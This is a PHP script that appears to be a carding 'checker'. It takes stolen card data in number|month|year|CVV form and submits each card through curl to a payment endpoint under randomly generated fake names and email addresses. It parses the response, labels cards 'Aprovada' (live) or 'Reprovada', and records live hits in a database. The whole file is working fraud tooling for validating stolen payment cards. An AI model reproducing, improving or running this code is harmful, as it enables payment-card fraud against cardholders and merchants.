<?php

error_reporting(0);
set_time_limit(0);
DeletarCookies();
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}


$separa = multiexplode(array(";", "»", "|", ":", " ", " | ", " ", " : "), $lista);
$numero = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

$cbin = substr($numero, 0,1);
if($cbin == "5"){
$cbin = "fa fa-cc-mastercard";
}else if($cbin == "4"){
$cbin = "fa fa-cc-visa";
}else if($cbin == "3"){
$cbin = "fa fa-cc-amex";
}else if($cbin == "6"){
$cbin = "fa fa-cc-discover";
}

function multiexplode($separadores, $string) {
    $a1 = str_replace($separadores, $separadores[0], $string);
    $a2 = explode($separadores[0], $a1);
    return $a2;
}

$valor1 = rand(1,5);
$valor2 = rand(10, 99);


$horario = date("d/m/y H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];

function deletarCookies() {
    if (file_exists("cookie.txt")) {
        unlink("cookie.txt");
    }
}


include("consultabin.php");

function inStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function getStr($string, $start, $end) {
	$str = explode($start, $string);
	$str = explode($end, $str[1]);
	return $str[0];
}

#-----------------------------------------------------------------------#

switch (substr($numero, 0, 1)) {
        case '4':
        $typeCard = 'VISA';
        $typeName = "VISA";
        break;
        case '5':
        $typeCard = 'MSTR';
        $typeName = "MSTR";
        break;
        case '3':
        break;
        case '6':
        $typeCard = 'DSCR';
        $typeName = "DSCR";
        break;
        case '3':
        $typeCard = 'AMEX';
        $typeName = "AMEX";
        break;
    }
    
switch ($mes) {
    case '01': $mes = '1';
        break;
    case '02': $mes = '2';
        break;
    case '03': $mes = '3';
        break;
    case '04': $mes = '4';
        break;
    case '05': $mes = '5';
        break;
    case '06': $mes = '6';
        break;
    case '07': $mes = '7';
        break;
    case '08': $mes = '8';
        break;
    case '09': $mes = '9';
        break;
}
switch ($ano) {
    case '18': $ano = '2018';
        break;
    case '19': $ano = '2019';
        break;
    case '20': $ano = '2020';
        break;
    case '21': $ano = '2021';
        break;
    case '22': $ano = '2022';
        break;
    case '23': $ano = '2023';
        break;
    case '24': $ano = '2024';
}

function email($nome){
  $email = preg_replace('<\W+>', "", $nome).rand(0000,9999)."@hotmail.com";
  return $email;
}

$names = array(
    'Christopher',
    'Ryan',
    'Ethan',
    'John',
    'Zoey',
    'Sarah',
    'Michelle',
    'Samantha',
);
 
$surnames = array(
    'Walker',
    'Thompson',
    'Anderson',
    'Johnson',
    'Tremblay',
    'Peltier',
    'Cunningham',
    'Simpson',
    'Mercado',
    'Sellers'
);
 
$random_name = $names[mt_rand(0, sizeof($names) - 1)];

$random_surname = $surnames[mt_rand(0, sizeof($surnames) - 1)];
 
$nome = $random_name . '+' . $random_surname;
$setname = $random_name . '' . $random_surname;

$email = email($setname);
#-----------------------------------------------------------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://localhost/elo%20loja/comiocudequemachou.php?lista=$numero|$mes|$ano|$cvv");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
$pagamento = curl_exec($ch);
$retorno = getStr($pagamento, "class='gfield_description validation_message' aria-live='polite'>","</div>");
if (strpos($pagamento, 'Your card was declined.') !== false) {
    echo "<th>#Reprovada <th> $numero $mes $ano $cvv Retorno: $retorno <th>##iOSCHECKERS</th>";
}elseif (strpos($pagamento, 'An error occurred while processing your card. Try again in a little bit.') !== false) {
    echo "<th>#Aprovada <th> $numero $mes $ano $cvv Retorno: $retorno <th>##iOSCHECKERS</th>";
    $sql = "INSERT INTO usuarios (lives) VALUES ('1')";
$query = mysqli_query($sql) or die(mysqli_error());
}else {
     echo "<th>#Reprovada <th> $numero $mes $ano $cvv Retorno: Your card number is incorrect. <th>##iOSCHECKERS</th>";
}
deletarCookies();
?>